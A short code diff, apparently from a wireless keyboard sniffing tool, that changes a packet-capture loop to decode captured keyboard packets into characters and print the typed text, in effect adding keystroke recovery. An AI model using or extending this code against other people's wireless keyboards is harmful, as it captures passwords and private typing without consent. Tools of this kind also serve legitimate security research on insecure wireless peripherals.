@@ -65,8 +65,10 @@ def sniff(keyboard, mouse):
                 if found_specific_address == byte_keyboard_address and len(value) >= keyboard.packet_size:
                     packet = keyboard.parse_packet(bytes(value))
                     if keyboard.check_crc(packet["crc"], packet["payload"]):
-                        print(f"Keyboard packet\tCHANNEL:{channels[channel_index]}")
-                        print(packet)
+                        # print(f"Keyboard packet\tCHANNEL:{channels[channel_index]}")
+                        # print(packet)
+                        entered_string += keyboard.scancode_to_char(packet["array"], packet["raw_modifiers"])
+                        print(entered_string)
                         # TODO put what's inside the packet in the entered_string variable and display it
                         last_tune = time.time()
                 
